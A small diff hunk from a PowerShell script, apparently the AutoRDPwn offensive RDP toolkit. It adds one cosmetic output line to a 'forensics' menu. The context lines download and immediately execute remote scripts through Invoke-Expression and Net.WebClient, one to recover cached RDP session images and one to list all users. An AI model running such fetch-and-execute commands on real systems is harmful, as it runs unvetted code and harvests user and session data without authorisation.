@@ -405,7 +405,7 @@ function Remove-Exclusions {
 
         if($forensics -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; Write-Host "[!] $txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/RDP-Caching.ps1') ; explorer $env:temp\Recovered_RDP_Session
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; Write-Host "[i] " -nonewline ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; Start-Sleep -milliseconds 2000 }
+        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; Start-Sleep -milliseconds 2000 }
 
         if($forensics -like '2') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/ListAllUsers.ps1') | Set-Clipboard ; Get-Clipboard
